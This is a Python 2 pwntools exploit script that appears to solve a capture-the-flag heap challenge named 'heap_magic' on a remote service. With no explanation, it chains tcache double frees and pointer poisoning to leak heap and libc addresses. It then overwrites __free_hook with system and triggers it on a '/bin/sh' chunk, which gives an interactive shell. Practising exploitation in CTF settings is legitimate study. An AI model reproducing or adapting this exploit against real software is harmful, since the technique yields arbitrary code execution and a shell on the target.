from pwn import *

def add(pay):
    go('1\n')
    go('n\n')
    go('1\n')
    go(pay)

def add_p(pay):
    go('1\n')
    go('n\n')
    go('3\n')
    go(pay)

def edit_m(pay):
    go('3\n')
    go('2\n')
    go(pay)

def free_m():
    go('4\n')
    go('n\n')
    go('1\n')

def edit_p(pay):
    go('3\n')
    go('4\n')
    go(pay)

def free_p():
    go('4\n')
    go('n\n')
    go('3\n')

def go(pay):
    p.recv()
    p.send(pay)

#p = process('./heap_magic')
p = remote('1.224.175.12', 9980)
e = ELF('./heap_magic')
l = e.libc

go('1\n')
go('1'*0xf)
go('2'*0x48)
go(str(0x1337)+'\n')
go('3'*0x48)

for i in range(2):
    free_m()

go('2\n')
go('1\n')
p.recvuntil(': ')

heap = u64(p.recvline().strip().ljust(8, '\x00')) - 0x10
print 'heap : ' + hex(heap)

add(p64(0))
add('a')
add('a')

free_m()
free_m()
edit_m(p64(heap))
add('a')
add(p64(0)+p64(0x51))


free_p()
free_p()
edit_p(p64(heap+0x10))
add_p('a')
edit_m(p64(0)+p64(0x51)+p64(0))
add_p('xxxx')

edit_m(p64(0)+p64(0xa1))
for i in range(8):
    free_p()

go('2\n')
go('3\n')

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ebca0
print 'libc : ' + hex(libc)

edit_m(p64(0)+p64(0x51)+p64(0))
free_p()
edit_p(p64(libc+l.sym['__free_hook']))

add_p('/bin/sh\x00')
add(p64(libc+l.sym['system']))

free_p()

p.interactive()